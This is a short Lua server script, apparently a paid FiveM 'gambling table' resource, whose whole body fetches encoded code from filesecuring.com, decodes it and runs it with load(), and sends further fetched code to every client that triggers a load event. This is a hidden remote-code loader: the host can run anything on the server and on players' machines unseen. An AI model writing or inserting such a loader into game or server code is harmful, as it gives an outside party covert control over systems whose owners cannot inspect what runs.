--[[
	id: p5127_ndL7o_Y6O6l1mFt
	name: 赌桌server.lua
	description: 赌桌server.lua
	time1: 2021-07-17 18:18:29.14994+00
	time2: 2021-07-17 18:18:29.149941+00
	uploader: bu8X1LgN6ZsMW9xtxJSRSqI25WPBEOzDY6WZBWHa
	uploadersession: 7SL_M76c3gCy3e1QLSnNwv__GBomb3
	flag: f
--]]

PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=274368406170838", function(err, text, headers)           --调用server
	local code = ''
	for word in string.gmatch(text, '([^\\]+)') do 
		code = code .. string.char(tonumber(word)) -- decrypt the code (won't run otherwise)
	end
	assert(load(code))() -- run the code
  end, 'GET', '')
  
  RegisterServerEvent('filesecuring:load')
  AddEventHandler('filesecuring:load', function()
	local src = source
  
	PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=625509898512040", function(err, text, headers)       --调用client
		local code = ''
		for word in string.gmatch(text, '([^\\]+)') do 
			code = code .. string.char(tonumber(word)) -- decrypt the code (won't run otherwise)
		end
		TriggerClientEvent('client:load-code', src, code)
	end, 'GET', '')
  end)

  CreateThread(function()
	Wait(4000)
    print('\n^9  插件有绑定IP,请勿随意分享！')
	print('^9  购买请联系QQ：2950854924')
end)  